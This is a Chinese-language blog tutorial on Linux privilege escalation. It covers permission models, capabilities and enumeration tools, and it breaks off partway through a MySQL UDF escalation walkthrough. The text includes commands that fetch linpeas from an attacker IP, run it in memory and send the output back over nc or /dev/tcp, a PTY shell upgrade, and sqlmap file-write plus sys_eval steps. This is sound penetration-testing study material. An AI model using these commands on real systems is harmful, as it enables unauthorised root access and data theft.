@@ -1,0 +1,974 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="I3eg1nner">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="「红队笔记」Linux 提权精讲Privilege Escation 可缩写为 PrivEsca 或 PE。提权操作存在的原因：应用程序通常是按需配置权限的 提权原理重要的权限体系 UGO 基本权限：Linux 操作系统中最常见的权限管理方式，UGO 分别代指文件所有者、组和其他人 补充知识点 1：目录的权限。对于目录来说，目录中存储的是该目录下文件&#x2F;目录名称的列表，因此如果一个用户拥有">
+<meta property="og:type" content="article">
+<meta property="og:title" content="「红队笔记」Linux提权精讲">
+<meta property="og:url" content="https://i3eg1nner.github.io/2023/07/fc6d5535056b.html">
+<meta property="og:site_name" content="I3eg1nner&#39;s blog">
+<meta property="og:description" content="「红队笔记」Linux 提权精讲Privilege Escation 可缩写为 PrivEsca 或 PE。提权操作存在的原因：应用程序通常是按需配置权限的 提权原理重要的权限体系 UGO 基本权限：Linux 操作系统中最常见的权限管理方式，UGO 分别代指文件所有者、组和其他人 补充知识点 1：目录的权限。对于目录来说，目录中存储的是该目录下文件&#x2F;目录名称的列表，因此如果一个用户拥有">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-07-04T02:32:21.000Z">
+<meta property="article:modified_time" content="2023-08-04T07:21:21.073Z">
+<meta property="article:author" content="I3eg1nner">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>「红队笔记」Linux提权精讲 - I3eg1nner&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"i3eg1nner.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>I3eg1nner</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="「红队笔记」Linux提权精讲"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-07-04 10:32" pubdate>
+          2023年7月4日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          30k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          247 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">「红队笔记」Linux提权精讲</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="「红队笔记」Linux-提权精讲"><a href="#「红队笔记」Linux-提权精讲" class="headerlink" title="「红队笔记」Linux 提权精讲"></a>「红队笔记」Linux 提权精讲</h1><p>Privilege Escation 可缩写为 PrivEsca 或 PE。提权操作存在的原因：应用程序通常是按需配置权限的</p>
+<h2 id="提权原理"><a href="#提权原理" class="headerlink" title="提权原理"></a>提权原理</h2><h3 id="重要的权限体系"><a href="#重要的权限体系" class="headerlink" title="重要的权限体系"></a>重要的权限体系</h3><ul>
+<li>UGO 基本权限：Linux 操作系统中最常见的权限管理方式，UGO 分别代指文件所有者、组和其他人<ul>
+<li>补充知识点 1：目录的权限。对于目录来说，目录中存储的是该目录下文件&#x2F;目录名称的列表，因此如果一个用户拥有对某个目录的 r 权限，这意味着可以通过 ls 命令列出文件，而如果拥有的是 x 权限，这意味着用户可以进入该目标并成为当前的工作目录，如果没有对某个目录的 x 权限，那么就无法查看该目录下文件的具体内容</li>
+<li>补充知识点 2：修改文件权限的相关信息。chown 用于改变文件所有者，chgrp 用于改变文件所属的组，chmod 用于改变文件的权限</li>
+<li>补充知识点 3：不同文件类型的表示。d 表示目录；- 表示普通文件；l 表示链接文件；b 表示块设备文件；c 表示字符设备文件；s 表示 socket 文件</li>
+<li>补充知识点 4：权限分配的两种方式<ul>
+<li>Symbolic method：<code>chmod WhoWhatWhich file | directory</code><ul>
+<li>Who - represents identities: u,g,o,a (user, group, other, all)</li>
+<li>What - represents actions: +, -, &#x3D; (add, remove, set exact)</li>
+<li>Which - represents access levels: r, w, x (read, write, execute) and s</li>
+</ul>
+</li>
+<li>Numeric method：<code>chmod ### file | directory</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>SUID, SGID, sticky: s means special.<ul>
+<li>SUID: A file with SUID always executes as the user who owns the file. If the file owner doesn’t have execute permissions, then use an uppercase S here.</li>
+<li>SGID: If set on a file, it allows the file to be executed as the group that owns the file (similar to SUID). If <strong>set on a directory</strong>, any files created in the directory will have their group ownership set to that of the <strong>directory owner</strong>.</li>
+<li>other + t (sticky): This permission does not affect individual files. <strong>Only the owner (and root)</strong> of a file <strong>can remove</strong> the file within that directory.. A common example of this is the <code>/tmp</code> directory</li>
+<li>Setting special permissions: SUID &#x3D; 4; SGID &#x3D; 2; Sticky &#x3D; 1; <code>chmod X### file | directory</code></li>
+<li>note: The permission set is noted by the lowercase t or x, where the x would normally indicate the execute privilege.</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<p>参考文章：<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/sparkdev/p/9573355.html">Linux ugo 权限 - sparkdev - 博客园 (cnblogs.com)</a><br><a target="_blank" rel="noopener" href="https://www.redhat.com/sysadmin/suid-sgid-sticky-bit">Linux permissions: SUID, SGID, and sticky bit | Enable Sysadmin (redhat.com)</a></p>
+</blockquote>
+<ul>
+<li>Capabilities: <ul>
+<li>背景：Linux 区分两类进程，特权进程(其有效用户标识为 0，也就是超级用户 root)和非特权进程(其有效用户标识为非零)。特权进程绕过所有内核权限检查，而非特权进程则根据进程凭证(通常为有效 UID，有效 GID 和补充组列表)进行完全权限检查。</li>
+<li>capabilities 机制出现的原因：SUID 虽然可以解决普通用户无需密码以 root 权限运行某些命令的问题，却带来了安全隐患。当运行设置了 SUID 的命令时，通常只是需要很小一部分的特权，但是 SUID 给了它 root 具有的全部权限。因此一旦 被设置了 SUID 的命令出现漏洞，就很容易被利用。也就是说 SUID 机制在增大了系统的安全攻击面。</li>
+<li>机制：将与 root 关联的特权划分为精细粒度的特权集，并将其按需分配给线程或者文件。对于进程来说，capabilities 是细分到线程的，即每个线程可以有自己的 capabilities。对于文件来说，capabilities 保存在文件的扩展属性中。<ul>
+<li>线程的 capabilities：每一个线程，具有 5 个 capabilities 集合，每一个集合使用 <code>64</code> 位掩码来表示，显示为 <code>16</code> 进制格式。<ul>
+<li>Permitted：并不使能线程的 capabilities。从 <code>Effective</code> 或 <code>Inheritable</code> 集合中添加或删除 capability 的前提是，添加或删除的 capability 必须包含在 Permitted 集合中</li>
+<li>Effective：内核检查线程是否可以进行特权操作时，检查的对象便是 <code>Effective</code> 集合。</li>
+<li>Inheritable：当执行 <code>exec()</code> 系统调用时，能够被新的可执行文件继承的 capabilities，被包含在 <code>Inheritable</code> 集合中。但包含在该集合中的 capabilities 并不会自动继承给新的可执行文件，即不会添加到新线程的 <code>Effective</code> 集合中，它只会影响新线程的 <code>Permitted</code> 集合。</li>
+<li>Bounding：<code>Bounding</code> 集合是 <code>Inheritable</code> 集合的超集，如果某个 capability 不在 <code>Bounding</code> 集合中，即使它在 <code>Permitted</code> 集合中，该线程也不能将该 capability 添加到它的 <code>Inheritable</code> 集合中。Bounding 集合的 capabilities 在执行 <code>fork()</code> 系统调用时会传递给子进程的 Bounding 集合，并且在执行 <code>execve</code> 系统调用后保持不变。</li>
+<li>Ambient：非特权用户如果在 <code>Permitted</code> 集合中有一个 capability，那么可以添加到 <code>Ambient</code> 集合中，这样它的子进程便可以在 <code>Ambient</code>、<code>Permitted</code> 和 <code>Effective</code> 集合中获取这个 capability。</li>
+</ul>
+</li>
+<li>文件的 capabilities<ul>
+<li>Permitted：在文件被执行时，会与线程的 Bounding 集合计算交集，然后添加到线程的 Permitted 集合中。</li>
+<li>Inheritable：这个集合与线程的 Inheritable 集合的交集，会被添加到执行完 execve() 后的线程的 Permitted 集合中。</li>
+<li>Effective：仅仅是一个标志位。如果设置开启，那么在执行完 execve() 后，线程 Permitted 集合中的 capabilities 会自动添加到它的 Effective 集合中。</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<p>这部分看着有点头疼，下次遇到了再捋捋，先做个简单的记录，推荐第一篇文章<br><a target="_blank" rel="noopener" href="https://icloudnative.io/posts/linux-capabilities-why-they-exist-and-how-they-work/">Linux Capabilities 入门教程：概念篇 – 云原生实验室 - Kubernetes|Docker|Istio|Envoy|Hugo|Golang|云原生 (icloudnative.io)</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/sparkdev/p/11417781.html">Linux Capabilities 简介 - sparkdev - 博客园 (cnblogs.com)</a><br>另外关于渗透中如何查看 capabilities 使用的命令如下<br><code>/sbin/getcap -r / 2&gt;/dev/null</code></p>
+</blockquote>
+<ul>
+<li>AppArmor 和 SELinux：这两种安全模块通过强制访问控制（MAC）策略增强了系统的安全性。它们可以限制进程和文件的访问权限，从而降低潜在的安全风险。<ul>
+<li>AppArmor 通过定义所谓的“配置文件”，为每个应用程序设定允许和禁止的操作，从而限制进程对系统资源的访问。</li>
+<li>SELinux 通过为文件、进程等系统资源分配安全上下文（安全标签），并根据预先定义的安全策略规则来控制访问</li>
+</ul>
+</li>
+<li>Access Control Lists (ACLs):ACLs 提供了比传统文件权限更灵活的权限管理方式，允许为特定用户和组分配文件或目录的特定权限。</li>
+<li>其他二十多个权限体系和安全机制</li>
+</ul>
+<h2 id="提权原理归纳"><a href="#提权原理归纳" class="headerlink" title="提权原理归纳"></a>提权原理归纳</h2><p>原理1：低权限可修改的可执行文件或脚本，能以高权限身份运行。这是从权限体系总结出来的，是一大类情形的原理。</p>
+<p>原理2：从用户行为角度，用低权限用户的运维人员，也需要记忆、输入、备份凭据，以备使用高权限用户完成操作。</p>
+<p>原理3：在权限的上层，捕捉、拦截、修改凭据信息或权限信息，如一些基于内存读取操作实现的内核利用。</p>
+<h2 id="Linux-提权枚举"><a href="#Linux-提权枚举" class="headerlink" title="Linux 提权枚举"></a>Linux 提权枚举</h2><p>这里只简单记录，对于自己比较熟练的不过赘述</p>
+<h3 id="终端升级与提高稳定性"><a href="#终端升级与提高稳定性" class="headerlink" title="终端升级与提高稳定性"></a>终端升级与提高稳定性</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;);&#x27;</span><br>CTRL + Z<br><span class="hljs-built_in">stty</span> raw -<span class="hljs-built_in">echo</span><br><span class="hljs-built_in">fg</span><br><span class="hljs-built_in">export</span> TERM=xterm-color<br><br><span class="hljs-comment"># 或者</span><br>rlwrap nc -lvnp &lt;port&gt;<br></code></pre></td></tr></table></figure>
+
+<h3 id="ps-ef"><a href="#ps-ef" class="headerlink" title="ps -ef"></a>ps -ef</h3><p><code>ps -A</code> 或 <code>-e</code>：查看所有运行进程</p>
+<p><code>ps axjf</code>：查看进程树</p>
+<p><code>ps aux</code>：显示所有用户的进程（a），显示启动进程的用户（u），并显示未连接到终端的进程（x）。</p>
+<p><code>top -n 1</code> : top 命令可以帮助用户监控系统性能，查看当前运行的进程及其资源使用情况，如 CPU 使用率、内存使用情况等。-n 是一个选项，用于指定 top 命令应显示的迭代次数。</p>
+<h3 id="netstat"><a href="#netstat" class="headerlink" title="netstat"></a>netstat</h3><p><code>netstat -a</code>：显示所有正在监听的端口和已建立的连接。</p>
+<p><code>netstat -at</code> 或 <code>netstat -au</code> 也可用于分别列出 TCP 或 UDP 协议。</p>
+<p><code>netstat -tp</code>：列出服务名称和 PID 信息的连接。</p>
+<p><code>netstat -ano</code>：<code>-a</code>，显示所有套接字；<code>-n</code>，不解析名称；<code>-o</code>：显示计时器</p>
+<h3 id="x2F-etc-x2F-fstab"><a href="#x2F-etc-x2F-fstab" class="headerlink" title="&#x2F;etc&#x2F;fstab"></a>&#x2F;etc&#x2F;fstab</h3><p>检测未挂载的文件系统</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/fstab<br></code></pre></td></tr></table></figure>
+
+<h3 id="提权辅助工具"><a href="#提权辅助工具" class="headerlink" title="提权辅助工具"></a>提权辅助工具</h3><ol>
+<li>LinPEAS，全称为 Linux Privilege Escalation Awesome Script，是一个用来搜索类 unix 主机上可能的提权路径的自动化脚本。Github： <a target="_blank" rel="noopener" href="https://github.com/carlospolop/privilegeescalation-awesome-scripts-suite/tree/master/linPEAS">https://github.com/carlospolop/privilegeescalation-awesome-scripts-suite/tree/master/linPEAS</a></li>
+<li>LinEnum：一个流行的 Linux 本地枚举脚本，用于收集有关系统的各种信息，识别不安全的配置，提取可用于提升权限的漏洞信息。 GitHub： <a target="_blank" rel="noopener" href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a></li>
+<li>linux-smart-enumeration (lse)：这是一个具有模块化功能的 Linux 本地枚举脚本，它可在不同的等级上运行以获取不同详细程度的信息。 GitHub： <a target="_blank" rel="noopener" href="https://github.com/diegocat-treitos/linux-smart-enumeration">https://github.com/diegocat-treitos/linux-smart-enumeration</a></li>
+<li>linux-exploit-suggester：该工具主要用于识别 Linux 系统中可能存在的可利用的漏洞，以帮助用户提升权限。 GitHub： <a target="_blank" rel="noopener" href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a></li>
+<li>Linuxprivchecker：一个用于检查 Linux 系统潜在安全问题的 Python 脚本，包括文件权限、系统服务和 SUID 二进制文件等。 GitHub： <a target="_blank" rel="noopener" href="https://github.com/sleventyeleven/linuxprivchecker">https://github.com/sleventyeleven/linuxprivchecker</a></li>
+<li>unix-privesc-check：这个脚本主要用于识别类 UNIX 系统中可能的权限升级路径，通过检查文件权限、系统配置等方面的问题。 GitHub： <a target="_blank" rel="noopener" href="https://github.com/pentestmonkey/unix-privesc-check">https://github.com/pentestmonkey/unix-privesc-check</a></li>
+</ol>
+<p>目标系统的环境将影响您将要使用的工具，例如，如果目标系统上没有安装 Python，那么用 Python 编写的工具将无法运行；如果系统针对某些函数、关键字做了屏蔽，就要换一个试试，这就是为什么最好熟悉几个工具，而不是只有一个专用工具。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 从GitHub直接执行</span><br>curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh<br><br><span class="hljs-comment"># 从内存中执行，结果发回kali</span><br>nc -lvnp 81 | <span class="hljs-built_in">tee</span> linpeas.out <span class="hljs-comment">#kali</span><br>curl 10.10.10.10/linpeas.sh | sh | nc 10.10.10.10 81 <span class="hljs-comment">#靶机</span><br><br><span class="hljs-comment"># 没有curl的情况，-q 指定 “nc” 命令中的超时时间。</span><br>sudo nc -q 5 -lvnp 80 &lt; linpeas.sh <span class="hljs-comment">#kali</span><br><span class="hljs-built_in">cat</span> &lt; /dev/tcp/10.10.10.10/80 | sh <span class="hljs-comment">#靶机</span><br><br><span class="hljs-comment"># 输出到文件</span><br>./linpeas.sh -a &gt; /dev/shm/linpeas.txt <span class="hljs-comment">#主机</span><br>less -r /dev/shm/linpeas.txt <span class="hljs-comment">#读取分色文件</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="提权实例"><a href="#提权实例" class="headerlink" title="提权实例"></a>提权实例</h2><h3 id="服务漏洞利用提权"><a href="#服务漏洞利用提权" class="headerlink" title="服务漏洞利用提权"></a>服务漏洞利用提权</h3><h4 id="MySQL-UDF-提权"><a href="#MySQL-UDF-提权" class="headerlink" title="MySQL-UDF 提权"></a>MySQL-UDF 提权</h4><p>UDF: User Defined Function</p>
+<p>提权条件</p>
+<ul>
+<li>掌握 MySQL 数据库的账户，该账户对 MySQL 拥有 create、insert、delete 等权限，以创建和使用函数（最好直接是 root 账户）</li>
+<li>securefile_priv 为空字符串（’’）：<code>show variables like &#39;%secure_file_priv%&#39;;</code> 这是能否利用 udf 提权的重要条件。它可以限制这些操作仅在特定目录下进行，以增强服务器的安全性。如果设置为 NULL 则禁用这些操作</li>
+</ul>
+<blockquote>
+<p>在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件<br>在 MySQL 5.5 之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件</p>
+</blockquote>
+<p>两种提权手法</p>
+<h5 id="手动上传动态链接库"><a href="#手动上传动态链接库" class="headerlink" title="手动上传动态链接库"></a>手动上传动态链接库</h5><p>查询是否 secure_file_priv 没有限制</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs SQL">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">show</span> <span class="hljs-keyword">global</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%secure_file_priv%&#x27;</span>;<br><span class="hljs-keyword">show</span> <span class="hljs-keyword">global</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%secure_file_priv%&#x27;</span>;<br><span class="hljs-operator">+</span><span class="hljs-comment">------------------+-------+</span><br><span class="hljs-operator">|</span> Variable_name    <span class="hljs-operator">|</span> <span class="hljs-keyword">Value</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">------------------+-------+</span><br><span class="hljs-operator">|</span> secure_file_priv <span class="hljs-operator">|</span>       <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">------------------+-------+</span><br><span class="hljs-number">1</span> <span class="hljs-type">row</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)<br></code></pre></td></tr></table></figure>
+
+<h6 id="动态链接库"><a href="#动态链接库" class="headerlink" title="动态链接库"></a>动态链接库</h6><p>如果是 MySQL &gt;&#x3D; 5.1 的版本，必须把 UDF 的动态链接库文件放置于 MySQL 安装目录下的 lib\plugin 文件夹下文件夹下才能创建自定义函数。</p>
+<p>Metasploit 里面都自带了对应系统的动态链接库文件。其位于 <code>/usr/…/metasploit-framework/data/exploits/mysql</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/usr/…/metasploit-framework/data/exploits/mysql]<br>└─$ <span class="hljs-built_in">ls</span> -liah<br>total 56K<br>395515 drwxr-xr-x   2 root root 4.0K Jun 20 05:31 .<br>394285 drwxr-xr-x 202 root root  20K Jun 20 05:31 ..<br>402381 -rwxr-xr-x   1 root root 6.5K Jun  1 12:22 lib_mysqludf_sys_32.dll<br>402382 -rw-r--r--   1 root root 5.6K Jun  1 12:22 lib_mysqludf_sys_32.so<br>402383 -rwxr-xr-x   1 root root 7.0K Jun  1 12:22 lib_mysqludf_sys_64.dll<br>402384 -rw-r--r--   1 root root 7.9K Jun  1 12:22 lib_mysqludf_sys_64.so<br></code></pre></td></tr></table></figure>
+
+<h6 id="插件目录位置"><a href="#插件目录位置" class="headerlink" title="插件目录位置"></a>插件目录位置</h6><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs SQL">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%plugin%&#x27;</span>;<br><span class="hljs-operator">+</span><span class="hljs-comment">---------------+------------------------------+</span><br><span class="hljs-operator">|</span> Variable_name <span class="hljs-operator">|</span> <span class="hljs-keyword">Value</span>                        <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">---------------+------------------------------+</span><br><span class="hljs-operator">|</span> plugin_dir    <span class="hljs-operator">|</span> <span class="hljs-operator">/</span>usr<span class="hljs-operator">/</span><span class="hljs-keyword">local</span><span class="hljs-operator">/</span>mysql<span class="hljs-operator">/</span>lib<span class="hljs-operator">/</span>plugin<span class="hljs-operator">/</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">---------------+------------------------------+</span><br></code></pre></td></tr></table></figure>
+
+<p>如果不存在的话可以在 webshell 中找到 MySQL 的安装目录然后手工创建 \lib\plugin 文件夹。关于如何确定 MySQL 的安装目录：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql&gt; <span class="hljs-keyword">select</span> @@basedir;<br>+------------------+<br>| @@basedir        |<br>+------------------+<br>| /usr/local/mysql |<br>+------------------+<br></code></pre></td></tr></table></figure>
+
+<h6 id="写入动态链接库"><a href="#写入动态链接库" class="headerlink" title="写入动态链接库"></a>写入动态链接库</h6><p>可以通过 SQLMap 来写入，前提：SQL 注入且是高权限，plugin 目录可写且需要 secure_file_priv 无限制，MySQL 插件目录可以被 MySQL 用户写入，这个时候就可以直接使用 sqlmap 来上传动态链接库，又因为 GET 有字节长度限制，所以往往 POST 注入才可以执行这种攻击</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://localhost:30008/&quot;</span> --data=<span class="hljs-string">&quot;id=1&quot;</span> --file-write=<span class="hljs-string">&quot;/Users/sec/Desktop/lib_mysqludf_sys_64.so&quot;</span> --file-dest=<span class="hljs-string">&quot;/usr/lib/mysql/plugin/udf.so&quot;</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">ERROR 1126 (HY000): Can<span class="hljs-string">&#x27;t open shared library &#x27;</span>udf.dll<span class="hljs-string">&#x27; (errno: 193 )</span><br><span class="hljs-string"># 这个报错，因为 lib_mysqludf_sys_64.dll 失败，最后使用 lib_mysqludf_sys_32.dll 才成功，所以这里的 dll 应该和系统位数无关，可能和 MySQL 的安装版本有关系，而 PHPStudy 自带的 MySQL 版本是 32 位的</span><br></code></pre></td></tr></table></figure>
+
+<h6 id="创建自定义函数并调用命令"><a href="#创建自定义函数并调用命令" class="headerlink" title="创建自定义函数并调用命令"></a>创建自定义函数并调用命令</h6><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs SQL">mysql <span class="hljs-operator">&gt;</span> <span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">FUNCTION</span> sys_eval <span class="hljs-keyword">RETURNS</span> STRING SONAME <span class="hljs-string">&#x27;udf.dll&#x27;</span>;<br></code></pre></td></tr></table></figure>
+
+<p>导入成功后查看一下 mysql 函数里面是否新增了 sys_eval：</p>
